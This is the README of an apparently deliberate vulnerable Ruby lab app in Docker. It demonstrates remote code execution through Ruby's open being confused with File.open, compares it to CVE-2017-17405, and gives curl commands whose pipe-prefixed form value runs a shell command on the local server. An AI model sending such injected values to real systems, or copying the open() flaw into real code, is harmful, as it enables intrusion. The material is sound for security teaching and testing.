### Ruby `open` vs. `File.open` mismatch

- Possible name confusion between two ruby native functions may lead to RCE
- This is similar to the root cause in [CVE-2017-17405][1] (see also [this blog][2])

### Installation

```bash
$ docker build --tag host.ruby_open --file Dockerfile .
$ docker run -p 8004:3000 -d -t --name ruby_open host.ruby_open

# let's send a GET request to make sure everything starts fine
$ curl -X GET http://127.0.0.1:8004/status
Everything seems fine # <--- good !

# send vulnerable payload
$ curl -X POST -F "source=\"| touch pwned\"" http://127.0.0.1:8004/vuln
>> 0

# make sure code was executed
$ curl -X GET http://127.0.0.1:8004/status
You've been pwned ! # <--- good !
```

[1]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-17405
[2]: https://blog.heroku.com/identifying-ruby-ftp-cve
